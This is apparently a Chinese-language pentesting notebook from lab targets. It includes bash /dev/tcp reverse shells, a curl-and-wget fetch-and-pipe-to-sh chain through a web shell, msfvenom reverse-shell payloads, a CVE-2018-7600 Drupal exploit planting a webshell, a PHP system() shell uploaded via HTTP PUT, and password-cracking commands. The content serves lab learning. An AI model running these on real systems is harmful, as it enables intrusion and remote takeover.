<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.碰到不熟悉的端口nc ip port 或者 telnet ip port 连上去敲个help或者version看看</span><br><span class="line"></span><br><span class="line">2.找到配置文件的信息别忘了password spray</span><br><span class="line"></span><br><span class="line">3.在kali浏览器打开这个域名解析的网页就可以，在本机浏览器却打不开，尽管他们互通，所以最好在kali里面的浏览器打开被域名解析的网站</span><br><span class="line"></span><br><span class="line">4.有时候在靶机里面用密码切换普通用户的时候不成功，所以最好直接用ssh连接即可</span><br><span class="line"></span><br><span class="line">5.在bp里面抓不到包的时候可以用bp的内置浏览器比如basic认证的登录框</span><br><span class="line"></span><br><span class="line">6.注意在哪个目录下面开启http服务，那么这那个目录就是根目录，所以在靶机上面wget的时候直接ip+端口/文件路径即可，这里的文件路径最好是kali的当前路径，所以文件在kali的存放位置也最好在当前目录</span><br><span class="line"></span><br><span class="line">7./bin/sh  得到的shell是#，没有前面的用户名跟系统名，而/bin/bash 得到的是root@ubuntu:~#  //所以用bash会更加一目了然</span><br></pre></td></tr></table></figure>

<h1 id="python3开启http服务"><a href="#python3开启http服务" class="headerlink" title="python3开启http服务"></a>python3开启http服务</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br><span class="line">python3 -m http.server</span><br><span class="line">reverse.sh:(/var/www/html下跟python3临时开放的http服务当前目录下都要有)</span><br><span class="line">/bin/bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.88.10/1234 0&gt;&amp;1&#x27;</span></span><br><span class="line"></span><br><span class="line">开启管道：</span><br><span class="line">curl -k https://192.168.88.9/?cmd=<span class="string">&#x27;wget+192.168.88.10:8000/reverse.sh+-O+-|sh&#x27;</span></span><br><span class="line"></span><br><span class="line">ss -tnlp   //查看正在进行的进程有哪些</span><br><span class="line"><span class="built_in">kill</span> -9 pid   //强制删除pid的进程</span><br></pre></td></tr></table></figure>

<h1 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h1><p>一个快速的Web路径&#x2F;参数爆破工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#x27;https://192.168.88.9?FUZZ=id&#x27; --fw 3928   //--fw 3928:过滤掉响应大小为 3928 字节的结果（通常用于排除错误页面）,其中 FUZZ 是占位符，会被字典中的内容替换。例如：尝试 url?admin=id、url?backup=id 等。</span><br><span class="line"></span><br><span class="line">递归扫描：发现有效参数后，可进一步爆破参数值：</span><br><span class="line">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#x27;https://192.168.88.9?admin=FUZZ&#x27; --fw 3928</span><br></pre></td></tr></table></figure>

<h1 id="Argon2Cracker-py"><a href="#Argon2Cracker-py" class="headerlink" title="Argon2Cracker.py"></a>Argon2Cracker.py</h1><p>破解 Argon2 哈希（如 <code>$argon2id$...</code> 格式）。前提是先安装argon2-cffi</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 创建虚拟环境（推荐放在 ~/venv_argon2）</span></span><br><span class="line">python3 -m venv ~/pythonxnhj/venv_argon2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> ~/pythonxnhj/venv_argon2/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 安装 argon2-cffi</span></span><br><span class="line">pip install argon2-cffi</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 下载 Argon2Cracker.py 脚本，粘贴代码后保存//在root的tools目录下</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 添加 Argon2Cracker.py 脚本执行权限</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x Argon2Cracker.py </span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 运行 Argon2Cracker.py 脚本</span></span><br><span class="line">python3 Argon2Cracker.py <span class="string">&#x27;你的哈希&#x27;</span> -w 字典.txt  //脚本字典路径要对</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 退出虚拟环境（完成后）</span></span><br><span class="line">deactivate</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次使用之后每次要使用Argon2Cracker.py时只需要下面3步即可</span></span><br><span class="line"><span class="built_in">source</span> ~/pythonxnhj/venv_argon2/bin/activate</span><br><span class="line"></span><br><span class="line">python3 Argon2Cracker.py <span class="string">&#x27;$argon2id$v=19$m=10240,t=10,p=8$FLuM1EM1nn/EP9ni1ust1A$BSnZUgXixY8B0Tzmffcz/9Zo9cvEO/PeAu8zw/iYNI4&#x27;</span> -w /root/5000.txt</span><br><span class="line"></span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure>

<h1 id="Drupwn-v1-0-4"><a href="#Drupwn-v1-0-4" class="headerlink" title="Drupwn v1.0.4"></a>Drupwn <a href="Lampiao">v1.0.4</a></h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先从官网上面下载源码，然后进入drupwn-master目录下面有dockerfile</span><br><span class="line">docker pull immunit/drupwn <span class="comment">#拉取官方镜像</span></span><br><span class="line">python3 -m venv myenv  <span class="comment">#python虚拟环境配置</span></span><br><span class="line"><span class="built_in">source</span> myenv/bin/activate</span><br><span class="line">pip install setuptools</span><br><span class="line">vim Dockerfile</span><br><span class="line">docker build -t drupwn .   <span class="comment">#docker搭建drupwn,第一次拉取时间会很长，耐心等待</span></span><br><span class="line">docker run --<span class="built_in">rm</span> -it drupwn --<span class="built_in">help</span>   <span class="comment">#构建过程结束后，获取并享受新 Drupal 扫描仪</span></span><br><span class="line">docker run --<span class="built_in">rm</span> -it drupwn --mode exploit --target http://192.168.88.30:1898</span><br><span class="line">生成的输出存储在 /tmp/ 文件夹中。 使用 docker 时，请使用以下选项运行容器</span><br><span class="line">-v YOUR_PATH_FOLDER:/tmp/  <span class="comment">#这条指令一般没用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dockerfile：</span><br><span class="line"></span><br><span class="line">FROM python:3.9-slim</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY . .</span><br><span class="line">RUN pip install --upgrade pip setuptools</span><br><span class="line">RUN pip install -r requirements.txt</span><br><span class="line">ENTRYPOINT [&quot;python&quot;, &quot;drupwn&quot;]</span><br><span class="line">CMD [&quot;--help&quot;]</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">一些操作：</span><br><span class="line">docker run --<span class="built_in">rm</span> -it drupwn --mode exploit --target http://192.168.88.30:1898</span><br><span class="line">Drupwn&gt; list</span><br><span class="line">Drupwn&gt; check CVE-2018-7600  <span class="comment">#存在这个漏洞</span></span><br><span class="line">[+] Application vulnerable</span><br><span class="line"></span><br><span class="line">Drupwn&gt; exploit CVE-2018-7600</span><br><span class="line">[+] Exploit completed. Webshell accessible at: http://192.168.88.30:1898/6ATEUF.php?c=CMD    <span class="comment">#它自己上传web shell成功，并给出web shell路径</span></span><br><span class="line"></span><br><span class="line">然后直接URL访问即可        </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# curl <span class="string">&quot;http://192.168.88.30:1898/6ATEUF.php?c=id&quot;</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"></span><br><span class="line">Drupwn&gt; quit   <span class="comment">#退出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run --<span class="built_in">rm</span> drupwn --mode enum --target http://192.168.88.30:1898  <span class="comment">#其他操作</span></span><br></pre></td></tr></table></figure>



<h1 id="SSH的kali本地端口转发功能"><a href="#SSH的kali本地端口转发功能" class="headerlink" title="SSH的kali本地端口转发功能"></a>SSH的kali本地端口转发功能</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8888:127.0.0.1:8888 room@192.168.88.9  //在kali里面执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-L 8888:127.0.0.1:8888	//将kali本机 (127.0.0.1:8888) 的 8888 端口映射到靶机的 8888 端口</span><br><span class="line">room@192.168.88.9	//使用 room 用户登录靶机 (192.168.88.9)</span><br><span class="line"></span><br><span class="line">输入 room 用户的密码（如果设置了 SSH 密钥，可能需要 -i id_rsa 指定私钥）。</span><br><span class="line">保持此终端窗口开启（关闭会终止转发）。</span><br><span class="line">打开kali本地浏览器访问 http://127.0.0.1:8888 即可</span><br></pre></td></tr></table></figure>

<h1 id="echo写入文件"><a href="#echo写入文件" class="headerlink" title="echo写入文件"></a>echo写入文件</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">在/tmp里面有写的权限，所以在提权的时候进入tmp目录,文件(a.c)不用先创建，在写入东西的时候文件(a.c)自然会被创建</span><br><span class="line"></span><br><span class="line">1.使用单引号（推荐）：</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#include &lt;unistd.h&gt;&#x27;</span> &gt; a.c</span><br><span class="line"></span><br><span class="line">2.双引号也可以，但需要确保内容中没有需要转义的 $、\ 等特殊字符（这里没有）:</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#include &lt;unistd.h&gt;&quot;</span> &gt; a.c</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">&gt;：会覆盖 a.c 的原有内容（如果文件已存在）</span><br><span class="line">&gt;&gt;：会追加内容到 a.c 的末尾（如果文件已存在）</span><br><span class="line">如：</span><br><span class="line"><span class="comment"># 先写入第一行</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#include &lt;unistd.h&gt;&#x27;</span> &gt; a.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后追加其他内容</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;int main() &#123;&#x27;</span> &gt;&gt; a.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;    printf(&quot;Hello World\\n&quot;);&#x27;</span> &gt;&gt; a.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;    return 0;&#x27;</span> &gt;&gt; a.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#125;&#x27;</span> &gt;&gt; a.c</span><br><span class="line"></span><br><span class="line">最终 a.c 文件内容：</span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="正向反向shell"><a href="#正向反向shell" class="headerlink" title="正向反向shell"></a>正向反向shell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正向Shell：受害者是服务器，攻击者是客户端。</span><br><span class="line"></span><br><span class="line">受害者：在本地打开一个端口并监听，等待连接，并将这个端口的输入输出与自己的命令行（如cmd.exe或/bin/bash）绑定。</span><br><span class="line"></span><br><span class="line">攻击者：像客户端一样，主动去连接受害者的IP和这个特定端口。一旦连接成功，攻击者就获得了受害者的Shell。</span><br><span class="line"></span><br><span class="line">反向Shell：攻击者是服务器，受害者是客户端。</span><br><span class="line"></span><br><span class="line">攻击者：在自己的机器上打开一个端口并监听，等待连接。一般是攻击者把受害者连接自己开放的IP端口的脚本通过漏洞利用上传到受害者的机器上再通过漏洞利用触发这个脚本</span><br><span class="line"></span><br><span class="line">受害者：主动向外连接攻击者的IP和这个特定端口，并将自己的命令行绑定到这个连接上。一旦连接成功，Shell就“反弹”给了攻击者。</span><br></pre></td></tr></table></figure>

<h1 id="lsattr–查看文件扩展属性-chat2"><a href="#lsattr–查看文件扩展属性-chat2" class="headerlink" title="lsattr–查看文件扩展属性(chat2)"></a>lsattr–查看文件扩展属性(chat2)</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsattr /home/discuz/chat    //lsattr用法</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">利用带SUID的 /usr/bin/chattr 移除 /home/discuz/chat 的 i 属性.</span><br><span class="line"></span><br><span class="line">特殊情况（使用带了SUID的/usr/bin/chattr）</span><br><span class="line">检查 chattr 的权限（有SUID权限）：</span><br><span class="line"></span><br><span class="line"># 注意所有者执行位是 &#x27;s&#x27; 而不是 &#x27;x&#x27;，这表示它设置了SUID。</span><br><span class="line">现在，同样是普通用户 discuz，执行命令：/usr/bin/chattr -i /home/discuz/chat</span><br><span class="line"></span><br><span class="line">此时，系统会创建一个以 discuz 的身份（EUID = discuz的UID）运行的 chattr 进程。</span><br><span class="line">因为 /usr/bin/chattr 设置了SUID位且属于 root，所以系统创建的 chattr 进程的有效用户ID（EUID）变成了0（root），而不是 discuz 的UID。</span><br><span class="line"></span><br><span class="line">这个以 root权限运行的进程现在试图去修改 /home/discuz/chat 文件的属性。</span><br><span class="line"></span><br><span class="line">系统再次进行权限检查：这个进程的EUID（root）是否是目标文件的所有者？或者是否是root？</span><br><span class="line"></span><br><span class="line">答案是：是！进程的EUID是root，而root用户拥有系统的最高权限，可以修改任何文件的属性，不受任何限制。</span><br><span class="line"></span><br><span class="line">因此，权限检查通过，i 属性被成功移除。</span><br><span class="line"></span><br><span class="line">SUID的作用：它临时提升了执行它的进程的权限，使其以文件所有者的身份（通常是root）运行。</span><br><span class="line"></span><br><span class="line">权限检查的逻辑：Linux内核只关心“谁在试图操作”（进程的EUID），而不关心“是谁发起的这个操作”（用户的真实UID）。SUID机制改变了“谁在试图操作”这个答案。</span><br><span class="line"></span><br><span class="line">一个简单的类比：</span><br><span class="line">你（普通用户discuz）想进入一个VIP房间（修改chat文件的属性），保安（内核）不让你进。</span><br><span class="line"></span><br><span class="line">但你有一张“root老板的权限卡”（SUID位的chattr）。你刷卡进入时，门禁系统认为你是root老板。</span><br><span class="line"></span><br><span class="line">保安看到是老板要进去，自然不会阻拦。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chattr -i chat   //chattr有suid权限</span><br><span class="line">chattr 的语法是：chattr [操作符][属性] 文件/目录</span><br><span class="line">+：增加一个属性</span><br><span class="line">-：移除一个属性</span><br><span class="line">chattr这个命令其实就是可以改变文件或文件夹的扩展属性，让用户不能删除、</span><br><span class="line">重命名、修改它或者是只能追加内容等。</span><br><span class="line"></span><br><span class="line">所以它能增加，自然我们也可以用它移除</span><br><span class="line"></span><br><span class="line">传统的Linux文件权限（如 chmod）控制的是“谁”能“做什么”（读、写、执行）。而 chattr 控制的则是“允许发生什么操作”，它施加的限制优先级更高，能覆盖传统的权限设置。即使一个用户拥有 rwx 所有权限，如果文件设置了某些 chattr 属性，该用户的操作依然会被拒绝。</span><br></pre></td></tr></table></figure>



<h1 id="备份文件-bak-chat2"><a href="#备份文件-bak-chat2" class="headerlink" title="备份文件.bak(chat2)"></a>备份文件.bak(chat2)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mv chat chat.bak</span><br><span class="line"></span><br><span class="line">给文件添加 .bak 扩展名是一种非常常见的做法，bak 是 backup（备份） 的缩写。</span><br><span class="line"></span><br><span class="line">这个命令的主要目的是：</span><br><span class="line">创建一个文件(chat)的备份副本(chat.bak)，同时在原地保留一个改名后的版本(chat.bak)，而不是复制一份。以便于在后续操作中在执行chat文件时不会影响备份文件(chat.bak)，如果chat文件损坏也可以用备份文件(chat.bak)。</span><br></pre></td></tr></table></figure>

<h1 id="msfvenom–生成-payload反弹shell-Cat"><a href="#msfvenom–生成-payload反弹shell-Cat" class="headerlink" title="msfvenom–生成 payload反弹shell(Cat)"></a>msfvenom–生成 payload反弹shell(Cat)</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.88.10 LPORT=1234 -f war -o shell.war</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">拓展知识：</span><br><span class="line"></span><br><span class="line">Msfvenom 是 Metasploit 框架中用于生成 payload（有效负载） 的工具。你可以把它理解为一个 “恶意代码工厂”，它可以根据你的需求，生成各种不同类型的、能在目标系统上执行的代码片段（通常用于获取对目标系统的访问权限，如反弹一个命令行 shell）。</span><br><span class="line"></span><br><span class="line">msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</span><br><span class="line"></span><br><span class="line">-p 指定要使用的 payload。</span><br><span class="line">java/jsp_shell_reverse_tcp 是这个 payload 的名称。它是一个用 Java JSP 编写的反向 TCP Shell。</span><br><span class="line">LHOST=192.168.88.10 LPORT=1234 攻击机kali的IP监听端口</span><br><span class="line">-f 指定输出格式(.war)。</span><br><span class="line">-o 指定输出文件名为shell.war</span><br></pre></td></tr></table></figure>

<h1 id="scp-–远程主机相互传输文件-Cat"><a href="#scp-–远程主机相互传输文件-Cat" class="headerlink" title="scp –远程主机相互传输文件(Cat)"></a>scp –远程主机相互传输文件(Cat)</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali执行；</span><br><span class="line">systemctl start ssh</span><br><span class="line">systemctl status ssh</span><br><span class="line">systemctl <span class="built_in">enable</span> ssh    //开机自启</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机执行：</span><br><span class="line">scp cat.jpg kali@192.168.88.10:/home/kali/Desktop</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">拓展知识：</span><br><span class="line"></span><br><span class="line">SCP 代表 Secure Copy Protocol（安全文件复制协议）。它是一个基于 SSH（Secure Shell）协议的命令行工具，主要用于在本地计算机和远程服务器之间，或者两台远程服务器之间安全地传输文件。</span><br><span class="line"></span><br><span class="line">scp [可选参数] [源文件路径] [目标文件路径]</span><br><span class="line">格式为：用户名@主机地址:文件路径</span><br><span class="line">catcatcat@Cat:~$ scp cat.jpg kali@192.168.88.10:/home/kali/Desktop</span><br></pre></td></tr></table></figure>

<h1 id="stegseek–隐写术分析工具-Cat"><a href="#stegseek–隐写术分析工具-Cat" class="headerlink" title="stegseek–隐写术分析工具(Cat)"></a>stegseek–隐写术分析工具(Cat)</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek cat.jpg rockyou.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">简单来说，steghide 是一个可以将文件（比如一个文本文件）隐藏到图片（如.jpg或.bmp）中的工具，通常需要密码。而 StegSeek 则是一个“密码破解器”，它通过暴力破解的方式，尝试一个巨大的密码字典（通常是rockyou.txt），来找出用于隐藏文件的密码并提取出隐藏内容。它的最大优点是速度极快。</span><br><span class="line"></span><br><span class="line">stegseek最常用、最基本的命令格式如下：</span><br><span class="line">stegseek &lt;图片路径&gt; &lt;字典路径&gt;</span><br><span class="line">stegseek cat.jpg rockyou.txt</span><br></pre></td></tr></table></figure>

<h1 id="Linux复制a文件的前100行到b文件"><a href="#Linux复制a文件的前100行到b文件" class="headerlink" title="Linux复制a文件的前100行到b文件"></a>Linux复制a文件的前100行到b文件</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">head</span> -n 100 a.txt &gt; b.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> /home/kali/Desktop/40000.txt /var/www/html  //复制/home/kali/Desktop/40000.txt到/var/www/html</span><br></pre></td></tr></table></figure>

<h1 id="nikto—自动化的“安全检查员”-Method"><a href="#nikto—自动化的“安全检查员”-Method" class="headerlink" title="nikto—自动化的“安全检查员”(Method)"></a>nikto—自动化的“安全检查员”(Method)</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://靶机IP -<span class="built_in">id</span> admin:princess101</span><br></pre></td></tr></table></figure>

<p><strong>Nikto</strong> 是一款开源的、功能强大的<strong>Web服务器扫描器</strong>。它用于对Web服务器进行全面的安全测试和漏洞扫描，以发现各种潜在的安全问题、错误配置和已知的漏洞。</p>
<p>简单来说，它就像一个自动化的“安全检查员”，专门负责检查网站和Web服务器是否存在常见的安全风险。</p>
<h1 id="put方法-Method"><a href="#put方法-Method" class="headerlink" title="put方法(Method)"></a>put方法(Method)</h1><p>这是一个<strong>高危</strong>信号！PUT方法允许客户端向服务器上传文件。如果服务器配置不当，开启了PUT方法，你就可以直接上传一个Web Shell。</p>
<ul>
<li><strong>漏洞：</strong> <strong>任意文件上传</strong>。</li>
<li><strong>操作：</strong><ol>
<li>用Burp拦截一个请求，将其方法从GET或POST改为 <strong><code>PUT</code></strong>。</li>
<li>在请求体中写入你的Web Shell代码，例如一个简单的PHP Shell：<code>&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;</code></li>
<li>将URL指向你希望上传的文件路径，例如：<code>PUT /shell.php HTTP/1.1</code></li>
<li>发送请求。如果返回 <code>201 Created</code> 或 <code>200 OK</code>，说明上传成功！</li>
<li>然后访问 <code>http://靶机IP/shell.php?cmd=id</code> 来执行系统命令。</li>
</ol>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.88.10/1234 0&gt;&amp;1&#x27;</span><br><span class="line"></span><br><span class="line">http://192.168.88.21/shell2.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.88.10/1234+0%3E%261%27    //URL 编码的反向 Shell (Reverse Shell) 载荷</span><br></pre></td></tr></table></figure>

<h1 id="msfvenom生成后门反弹shell-DC-3"><a href="#msfvenom生成后门反弹shell-DC-3" class="headerlink" title="msfvenom生成后门反弹shell(DC-3)"></a>msfvenom生成后门反弹shell(DC-3)</h1><p><strong>根据你提供的目标系统、攻击载荷等信息，生成一个能被目标系统执行的、经过混淆的恶意代码片段（即Payload，有效负载）</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfvenom结合msfconsole</span><br><span class="line">攻击者使用 msfvenom：生成一个自定义的、经过编码的恶意可执行文件（例如一个后门backdoor.exe）。</span><br><span class="line"></span><br><span class="line">传递Payload：通过社会工程学（如钓鱼邮件）、文件上传漏洞等方式，将这个backdoor.exe文件传送到目标机器上并诱骗用户执行。</span><br><span class="line"></span><br><span class="line">攻击者设置监听器：在 msfconsole 中启动一个 multi/handler 模块，配置好与生成Payload时完全相同的攻击载荷（如 windows/meterpreter/reverse_tcp）和参数（如LHOST, LPORT）。</span><br><span class="line"></span><br><span class="line">建立连接：一旦目标机器上的backdoor.exe被执行，它会主动连接回攻击者机器的监听端口。</span><br><span class="line"></span><br><span class="line">获得控制权：连接建立后，攻击者就会在 msfconsole 中获得一个会话（session），例如一个 meterpreter shell，从而可以控制目标机器。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads   //查看所有payload</span><br></pre></td></tr></table></figure>

<p><strong>LHOST跟LPORT填攻击者的IP和端口</strong></p>
<p><strong>生成一个Windows 64位反向TCP Meterpreter可执行文件：</strong></p>
